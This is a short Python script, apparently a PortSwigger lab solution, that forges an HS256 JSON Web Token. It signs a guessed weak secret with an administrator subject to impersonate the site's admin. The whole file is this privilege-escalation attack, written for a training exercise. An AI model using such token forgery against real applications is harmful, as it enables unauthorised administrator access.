import jwt
import time

secret = "secret1"
header ={
    "kid": "dcbfc624-2bc7-48b7-82fa-8df440ceb70f",
    "alg": "HS256",
}
payload = {
    "iss": "portswigger",
    "sub": "administrator",
    "exp": 1772359794, 
}
token = jwt.encode(payload, secret, algorithm="HS256", headers=header)
print("TOKEN NEW: ", token)

decoded = jwt.decode(token, secret, algorithms=["HS256"])
print(decoded)